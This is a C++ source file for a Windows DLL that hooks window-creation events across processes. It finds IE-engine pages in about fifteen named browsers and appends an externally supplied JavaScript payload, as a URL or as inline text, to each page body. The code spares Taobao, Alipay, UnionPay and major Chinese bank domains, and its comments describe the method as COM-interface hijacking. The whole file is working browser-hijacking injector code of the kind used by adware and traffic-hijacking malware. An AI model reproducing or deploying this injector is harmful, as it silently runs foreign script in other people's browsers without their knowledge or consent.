// WinEventHook.cpp : 定义 DLL 应用程序的导出函数。
//

#include "stdafx.h"



#include <OleAcc.h>
#include <ExDisp.h>
#include <MsHTML.h>
#include <OleAcc.h>
#include <ServProv.h>
#include <atlcomcli.h>
#include <ShlGuid.h>
#include <Shlwapi.h>
#include <atlstr.h>
#include <Psapi.h>

#pragma comment(lib,"shlwapi.lib")
#pragma comment(lib,"atlsd.lib") 
#pragma comment(lib,"oleacc.lib")
#pragma comment(lib,"psapi.lib")
#include <map>
#include <list>
using namespace std;

LPFNOBJECTFROMLRESULT pfObjectFromLresult = NULL;
CString g_strJsData;
BOOL    g_bJsUrl = TRUE;

IWebBrowser2 * GetIWebBrowser2Interface(HWND BrowserWnd) 
{
	CoInitialize(NULL);

	HRESULT hr;
	LRESULT lRes; 
	const UINT nMsg = ::RegisterWindowMessage( L"WM_HTML_GETOBJECT" );
	::SendMessageTimeout( BrowserWnd, nMsg, 0L, 0L, SMTO_ABORTIFHUNG, 1000, (DWORD_PTR*)&lRes );

	if ( pfObjectFromLresult  )
	{
		CComPtr<IServiceProvider> spServiceProv;
		hr = (*pfObjectFromLresult)( lRes, IID_IServiceProvider, 0, (void**)&spServiceProv );
		if ( SUCCEEDED(hr) )
		{
			IWebBrowser2* pWebBrowser2=NULL;
			hr = spServiceProv->QueryService(SID_SWebBrowserApp,
				IID_IWebBrowser2,(void**)&pWebBrowser2);
			return pWebBrowser2;
		} 
	}

	CoUninitialize();

	return NULL;
}

IWebBrowser2 * GetIWebBrowser2InterfaceEx(HWND BrowserWnd) 
{
	CoInitialize(NULL);

	HRESULT hr;
	LRESULT lRes; 
	const UINT nMsg = ::RegisterWindowMessage( L"WM_DESTORY_EX" );
	::SendMessageTimeout( BrowserWnd, nMsg, 0L, 0L, SMTO_ABORTIFHUNG, 1000, (DWORD_PTR*)&lRes );

	if ( pfObjectFromLresult  )
	{
		CComPtr<IServiceProvider> spServiceProv;
		hr = (*pfObjectFromLresult)( lRes, IID_IServiceProvider, 0, (void**)&spServiceProv );
		if ( SUCCEEDED(hr) )
		{
			IWebBrowser2* pWebBrowser2=NULL;
			hr = spServiceProv->QueryService(SID_SWebBrowserApp,
				IID_IWebBrowser2,(void**)&pWebBrowser2);
			return pWebBrowser2;
		} 
	}

	CoUninitialize();

	return NULL;
}


BOOL InjectScriptText(IWebBrowser *pWb,CString strJSData,BOOL bJsUrl)
{
	if (pWb == NULL)
	{
		return FALSE;
	}
	CComQIPtr<IHTMLDocument> pDoc;
	HRESULT hr = pWb->get_Document((IDispatch **)&pDoc);
	if ( FAILED(hr) || pDoc == NULL )
	{
		return FALSE;
	}

	CComQIPtr<IHTMLDocument2> pDoc2(pDoc);
	if (pDoc2 == NULL)
	{
		return FALSE;
	}

	CComQIPtr<IHTMLBodyElement> pBody(pDoc2);
	pDoc2->get_body((IHTMLElement **)&pBody);
	if (pBody == NULL)
	{
		return FALSE;
	}


	CComQIPtr<IHTMLElement> pElem;   
	CComQIPtr<IHTMLElement> pJscript;

	CComQIPtr<IHTMLDocument3> pDoc3 = pDoc;
	CComQIPtr<IDispatch> iDisp;
	CComBSTR PJsType = _T("script");      //javascript对象 

	hr = pDoc2->createElement(PJsType,&pJscript); //创建新元素对象
	if(FAILED(hr) || !pJscript ) 
		return FALSE;  

	CComQIPtr<IHTMLScriptElement,&IID_IHTMLScriptElement> pScriptNode(pJscript);

	pScriptNode->put_type(CComBSTR("text/javascript")); //设置JS类型

	if (bJsUrl)
	{
		BSTR bstrJsUrl = strJSData.AllocSysString();
		pScriptNode->put_src(bstrJsUrl);
		SysFreeString(bstrJsUrl);
	}
	else
	{
		BSTR bstrInjectHtml = strJSData.AllocSysString();
		hr = pScriptNode->put_text(bstrInjectHtml);
		SysFreeString(bstrInjectHtml);
	}

	CComQIPtr< IHTMLDOMNode, &IID_IHTMLDOMNode > pBodyNode(pBody); //转为节点对象 

	if(pBodyNode && pDoc) 
	{ 
		CComQIPtr<IHTMLDOMNode,&IID_IHTMLDOMNode> pNewChild(pScriptNode); //转为节点对象 
		CComPtr<IHTMLDOMNode> pRefChild; 

		hr = pBodyNode->appendChild(pNewChild, &pRefChild); //加载body页面后面
		return hr==S_OK;
	} 
	return E_FAIL;
}

class CLock
{
public:
	CLock()
	{
		m_hMutex = CreateMutexW(NULL,FALSE,NULL);
	}
	~CLock()
	{
		CloseHandle(m_hMutex);
	}
protected:
	HANDLE m_hMutex;
public:
	void Lock()
	{
		WaitForSingleObject(m_hMutex,INFINITE);
	}
	void UnLock()
	{
		ReleaseMutex(m_hMutex);
	}
};

class CWinUrlMgr
{
	typedef struct IE_SERVER_INFO
	{
		CString strUrl;
		DWORD   dwLastInjectTime;
	}IE_SERVER_INFO,*PIE_SERVER_INFO;
	typedef map<HWND,IE_SERVER_INFO> MAP_WIN_URL;
	typedef MAP_WIN_URL::iterator MAP_WIN_URL_PTR;

protected:
	MAP_WIN_URL m_WinUrl;
	CLock       m_WinMapLock;
public:
	CWinUrlMgr()
	{

	}
	~CWinUrlMgr()
	{

	}
	//返回值 是否已经插入过矩阵
	BOOL CheckWinUrl(HWND hWnd,LPCWSTR pszUrl)
	{
		BOOL bRes = FALSE;

		m_WinMapLock.Lock();

		MAP_WIN_URL_PTR it = m_WinUrl.find(hWnd);
		if (it!=m_WinUrl.end())
		{

			if ( GetTickCount() - it->second.dwLastInjectTime < 2000 )
			{
				bRes = TRUE;
			}
				
			if(it->second.strUrl.CompareNoCase(pszUrl) == 0)
			{
				bRes = TRUE;
			}
		}

		m_WinMapLock.UnLock();

		return bRes;
	}
	

	BOOL AddOrModifyWinUrl(HWND hWnd,LPCWSTR pszUrl)
	{
		BOOL bRes = FALSE;
		m_WinMapLock.Lock();

		MAP_WIN_URL_PTR it = m_WinUrl.find(hWnd);
		if (it!=m_WinUrl.end())
		{
			it->second.strUrl = pszUrl;
			it->second.dwLastInjectTime = GetTickCount();

			bRes = TRUE;
		}
		else
		{
			int nPreSize = m_WinUrl.size();
			IE_SERVER_INFO ServerInfo;
			ServerInfo.strUrl = pszUrl;
			ServerInfo.dwLastInjectTime = GetTickCount();
			m_WinUrl.insert(make_pair(hWnd,ServerInfo));
			bRes = (m_WinUrl.size() - nPreSize) == 1 ;
		}

		m_WinMapLock.UnLock();

		return bRes;
	}

	VOID ClearClosedWindow()
	{
		m_WinMapLock.Lock();

		MAP_WIN_URL tempWinUrl;

		for (MAP_WIN_URL_PTR it=m_WinUrl.begin();it!=m_WinUrl.end();it++)
		{
			if (::IsWindow(it->first))
			{
				tempWinUrl.insert(make_pair(it->first,it->second));
			}
		}
		
		m_WinUrl.clear();


		for (MAP_WIN_URL_PTR it=tempWinUrl.begin();it!=tempWinUrl.end();it++)
		{
			if (::IsWindow(it->first))
			{
				m_WinUrl.insert(make_pair(it->first,it->second));
			}
		}

		m_WinMapLock.UnLock();
	}

};
CWinUrlMgr WinUrlMgr;

typedef struct EVENT_INFO
{
	HWINEVENTHOOK hWinEventHook;
	DWORD         event;
	HWND          hwnd;
	LONG          idObject;
	LONG          idChild;
	DWORD         idEventThread;
	DWORD         dwmsEventTime;

}EVENT_INFO,*PEVENT_INFO;
typedef list<EVENT_INFO> EVENT_LIST;
typedef EVENT_LIST::iterator EVENT_LIST_PTR;

EVENT_LIST g_EventList;
CLock g_EventListLock;

VOID HandleEvent(
				 HWINEVENTHOOK hWinEventHook,
				 DWORD         event,
				 HWND          hwnd,
				 LONG          idObject,
				 LONG          idChild,
				 DWORD         idEventThread,
				 DWORD         dwmsEventTime
				 );

DWORD WINAPI WorkThread(PVOID pParam)
{
	while (true)
	{
		g_EventListLock.Lock();

		while ( FALSE == g_EventList.empty())
		{
			EVENT_INFO &EventInfo = g_EventList.front();
			HandleEvent(
				EventInfo.hWinEventHook,
				EventInfo.event,
				EventInfo.hwnd,
				EventInfo.idObject,
				EventInfo.idChild,
				EventInfo.idEventThread,
				EventInfo.dwmsEventTime
				);
			g_EventList.pop_front();
			Sleep(1);
		}

		g_EventListLock.UnLock();
		Sleep(1000);
	}
}


BOOL GetProcessName(DWORD processID,WCHAR *pszProcessName,DWORD dwBufferLen )
{
	HANDLE hProcess = OpenProcess( PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processID);
	if (hProcess == FALSE)
	{
		return FALSE;
	}

	typedef BOOL (WINAPI *TypeQueryFullProcessImageName)(
		HANDLE hProcess,
		DWORD dwFlags,
		LPTSTR lpExeName,
		PDWORD lpdwSize
		);
	TypeQueryFullProcessImageName pQueryFullProcessImageName = (TypeQueryFullProcessImageName)GetProcAddress(GetModuleHandleW(L"kernel32.dll"),"QueryFullProcessImageNameW");
	if (pQueryFullProcessImageName)
	{
		pQueryFullProcessImageName(hProcess,0,pszProcessName,&dwBufferLen);
	}
	else
	{
		DWORD dwRes =  GetModuleFileNameEx(hProcess, NULL, pszProcessName, dwBufferLen);
	}

	CloseHandle(hProcess);

	return TRUE;


}



BOOL CheckBrowser(HWND hWnd)
{
	DWORD dwProcessID = 0;
	DWORD dwThread = GetWindowThreadProcessId(hWnd,&dwProcessID);
	
	BOOL bInjectMatrix = FALSE;

	CString strProcessName;
	GetProcessName(dwProcessID,strProcessName.GetBuffer(MAX_PATH),MAX_PATH);
	strProcessName.ReleaseBuffer();

	if ( strProcessName.GetLength() > 0 )
	{
		//如果 反劫持业务没有开启，则所有可能包含IE内核的浏览器均采用COM接口劫持方式注入
		
		CString strExeName;
		strExeName = strProcessName.Right(strProcessName.GetLength() - strProcessName.ReverseFind(L'\\')-1);

		BOOL bRandProcName = FALSE;
		if (
			strExeName.CompareNoCase(L"iexplore.exe")==0
			|| strExeName.CompareNoCase(L"theworld.exe")==0
			|| strExeName.CompareNoCase(L"maxthon.exe")==0
			|| strExeName.CompareNoCase(L"ucbrowser.exe")==0
			|| strExeName.CompareNoCase(L"360chrome.exe")==0
			|| strExeName.CompareNoCase(L"liebao.exe")==0
			|| strExeName.CompareNoCase(L"f1browser.exe")==0
			|| strExeName.CompareNoCase(L"2345explorer.exe")==0
			|| strExeName.CompareNoCase(L"safari.exe")==0
			|| strExeName.CompareNoCase(L"reying.exe")==0
			|| strExeName.CompareNoCase(L"ruiying.exe")==0
			|| strExeName.CompareNoCase(L"360se.exe")==0
			|| strExeName.CompareNoCase(L"sogouexplorer.exe")==0
			|| strExeName.CompareNoCase(L"qqbrowser.exe")==0
			|| strExeName.CompareNoCase(L"lheb.exe")==0
			)
		{
			bInjectMatrix = TRUE;
		}
	}

	return bInjectMatrix;
}

//检查是否需要放过的域名
BOOL CheckUrl(CString strUrl)
{
	
	if(
		strUrl.Find(TEXT("taobao.com")) >= 0 ||
		strUrl.Find(TEXT("boc.cn")) >= 0 ||
		strUrl.Find(TEXT("icbc.com.cn")) >= 0 ||
		strUrl.Find(TEXT("ccb.com")) >= 0 ||
		strUrl.Find(TEXT("abchina.com")) >= 0 ||
		strUrl.Find(TEXT("psbc.com")) >= 0 ||
		strUrl.Find(TEXT("bankcomm.com")) >= 0 ||
		strUrl.Find(TEXT("hxb.com.cn")) >= 0 ||
		strUrl.Find(TEXT("cmbchina.com")) >= 0 ||
		strUrl.Find(TEXT("ecitic.com")) >= 0 ||
		strUrl.Find(TEXT("cmbc.com.cn")) >= 0 ||
		strUrl.Find(TEXT("cib.com.cn")) >= 0 ||
		strUrl.Find(TEXT("cgbchina.com.cn")) >= 0 ||
		strUrl.Find(TEXT("spdb.com.cn")) >= 0 ||
		strUrl.Find(TEXT("cebbank.com")) >= 0 ||
		strUrl.Find(TEXT("pingan.com")) >= 0 ||
		strUrl.Find(TEXT("alipay.com")) >= 0 ||
		strUrl.Find(TEXT("unionpay.com")) >= 0
		)
	{
		return FALSE;		
	}
	return  TRUE;

}
//处理通知消息
VOID HandleEvent(
				 HWINEVENTHOOK hWinEventHook,
				 DWORD         event,
				 HWND          hwnd,
				 LONG          idObject,
				 LONG          idChild,
				 DWORD         idEventThread,
				 DWORD         dwmsEventTime
				 )
{

	do 
	{
		WCHAR strClassName[MAX_PATH]={0};
		GetClassName(hwnd,strClassName,MAX_PATH);

		if ( StrCmpIW(L"Internet Explorer_Server",strClassName) != 0 )
		{
#ifdef DEBUG
			//OutputDebugStringW(L"窗口标题不符合\n");
#endif
			break;
		}
		


		BOOL bInject = CheckBrowser(hwnd);
		if( FALSE == bInject )
		{
			break;
		}

		IWebBrowser2 *pWb2 = GetIWebBrowser2Interface(hwnd);
		if ( NULL == pWb2 )
		{
			pWb2 = GetIWebBrowser2InterfaceEx(hwnd);
		}

		if (pWb2 == NULL)
		{
			break;
		}

		CComQIPtr<IWebBrowser> pWb(pWb2);
		if (pWb == NULL)
		{
			break;
		}

		BSTR bstrUrl;
		pWb->get_LocationURL(&bstrUrl);
		CString strUrl;
		strUrl = bstrUrl;

		if (CheckUrl(strUrl) == FALSE)
		{
			OutputDebugStringW(L"不插入的页面\n");
			break;
		}

		BOOL bCheckRes = WinUrlMgr.CheckWinUrl(hwnd,strUrl);
		if ( strUrl.Find(L"res://") < 0 && FALSE == bCheckRes )
		{
			//插入矩阵JS
			BOOL bJzJsRes = InjectScriptText(pWb,g_strJsData,g_bJsUrl);

			if ( bJzJsRes )
			{
				WinUrlMgr.AddOrModifyWinUrl(hwnd,strUrl);

				CString strDebugOut;
				strDebugOut.Format(L"插入矩阵 %s\n",strUrl);
				OutputDebugStringW(strDebugOut);

			}
		}
		else
		{
			OutputDebugStringW(L"该页面已经插入过矩阵\n");
		}
	} while (FALSE);

}

VOID CALLBACK MYWINEVENTPROC(
							 HWINEVENTHOOK hWinEventHook,
							 DWORD         event,
							 HWND          hwnd,
							 LONG          idObject,
							 LONG          idChild,
							 DWORD         idEventThread,
							 DWORD         dwmsEventTime
							 )
{

	if (EVENT_OBJECT_CREATE == event)
	{
		g_EventListLock.Lock();

		EVENT_INFO EventInfo;
		EventInfo.hWinEventHook =hWinEventHook;
		EventInfo.event = event;
		EventInfo.hwnd = hwnd;
		EventInfo.idObject = idObject;
		EventInfo.idChild = idChild;
		EventInfo.idEventThread = idEventThread;
		EventInfo.dwmsEventTime = dwmsEventTime;
		g_EventList.push_back(EventInfo);

		g_EventListLock.UnLock();
	}
}

DWORD WINAPI WindowCloseCheckThread(PVOID pParam)
{
	while (TRUE)
	{
		OutputDebugStringW(L"清理 已经关闭的窗口\n");

		Sleep(30000);//30秒清理一次
		WinUrlMgr.ClearClosedWindow();
	}
	return TRUE;
}

BOOL InstallEventHook()
{
	HINSTANCE hInst = ::LoadLibrary( L"OLEACC.DLL" );
	if ( hInst )
	{
		pfObjectFromLresult = (LPFNOBJECTFROMLRESULT)::GetProcAddress( hInst, "ObjectFromLresult" );
	}
	if (pfObjectFromLresult)
	{
		HWINEVENTHOOK hHook = SetWinEventHook(EVENT_OBJECT_CREATE,EVENT_OBJECT_CREATE,NULL,MYWINEVENTPROC,NULL,NULL,WINEVENT_OUTOFCONTEXT|WINEVENT_SKIPOWNTHREAD|WINEVENT_SKIPOWNPROCESS); 
		
		if (hHook!=NULL)
		{
			CreateThread(NULL,0,WindowCloseCheckThread,NULL,0,NULL);
			CreateThread(NULL,0,WorkThread,NULL,0,NULL);
		}

		return  hHook!=NULL;	
	}

	return FALSE;
}

VOID UpdateJsText( LPCWSTR pszJsData , BOOL bJsUrl )
{
	g_strJsData = pszJsData;
	g_bJsUrl = bJsUrl;
}